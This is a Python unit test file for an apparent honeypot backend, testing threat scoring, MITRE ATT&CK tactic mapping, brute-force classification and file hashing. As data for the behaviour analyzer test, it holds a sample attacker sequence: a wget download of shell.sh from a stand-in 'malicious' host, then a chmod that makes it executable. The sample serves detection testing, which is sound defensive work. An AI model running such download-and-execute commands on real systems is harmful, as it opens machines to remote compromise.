import os
import unittest
from backend.app.config.settings import settings
from backend.app.services.scoring_engine import scoring_engine_instance
from backend.app.services.behavior_analyzer import behavior_analyzer_instance
from backend.app.services.ai_engine import ai_engine_instance
from backend.app.utils.helpers import get_file_hash

class TestSentinelAIHoneypot(unittest.TestCase):
    
    def test_settings_initialization(self):
        """Validates configuration directories and variable defaults."""
        self.assertIsNotNone(settings.PORT_SSH)
        self.assertIsNotNone(settings.MONGO_DB_NAME)
        self.assertTrue(os.path.exists(settings.LOG_DIR))

    def test_threat_scoring_engine(self):
        """Tests that the dynamic security scoring computes expected bounds."""
        # 1. Base login attempt probe
        low_threat_features = {
            "login_attempts": 2,
            "commands_count": 0,
            "malware_uploaded": 0,
            "scan_requests_count": 0,
            "payload_sql_score": 0,
            "payload_cmd_score": 0
        }
        res_low = scoring_engine_instance.calculate_threat_score(low_threat_features)
        self.assertEqual(res_low["level"], "Low")
        self.assertTrue(res_low["score"] <= 30.0)

        # 2. Critical payload upload with exploit injection
        critical_threat_features = {
            "login_attempts": 10,
            "commands_count": 15,
            "malware_uploaded": 1,
            "scan_requests_count": 5,
            "payload_sql_score": 0,
            "payload_cmd_score": 5
        }
        res_crit = scoring_engine_instance.calculate_threat_score(critical_threat_features)
        self.assertEqual(res_crit["level"], "Critical")
        self.assertTrue(res_crit["score"] >= 86.0)

    def test_behavior_analyzer(self):
        """Verifies MITRE ATT&CK tactics mapping triggers on shell commands."""
        commands = [
            {"command": "whoami", "response": ""},
            {"command": "wget http://malicious/shell.sh", "response": ""},
            {"command": "chmod +x shell.sh", "response": ""}
        ]
        res = behavior_analyzer_instance.analyze_command_sequence(commands)
        self.assertIn("Discovery", res["mitre_tactics"])
        self.assertIn("Command and Control", res["mitre_tactics"])
        self.assertIn("Defense Evasion", res["mitre_tactics"])
        self.assertTrue(res["risk_indicators_count"] >= 3)

    def test_ai_engine_classification(self):
        """Validates model classification probabilities and plain-text XAI justifications."""
        features = {
            "login_attempts": 25,
            "distinct_usernames": 1,
            "distinct_passwords": 24,
            "commands_count": 0,
            "command_length_max": 0,
            "malware_uploaded": 0,
            "scan_requests_count": 0,
            "payload_sql_score": 0,
            "payload_cmd_score": 0,
            "session_duration": 45.0
        }
        ai_res = ai_engine_instance.classify_session_behavior(features)
        self.assertEqual(ai_res["class"], "Brute Force")
        self.assertIn("Brute Force", ai_res["explanation"])
        self.assertIsNotNone(ai_res["confidence"])

    def test_file_hashing_helper(self):
        """Verifies hash helper matches standard hashing output."""
        test_file = os.path.join(settings.LOG_DIR, "test_hash.txt")
        with open(test_file, "w") as f:
            f.write("SentinelAI Test File Content")
            
        hashes = get_file_hash(test_file)
        self.assertEqual(hashes["md5"], "87e558453193f17024e2a43404ff321d")
        
        # Cleanup
        if os.path.exists(test_file):
            os.remove(test_file)

if __name__ == "__main__":
    unittest.main()
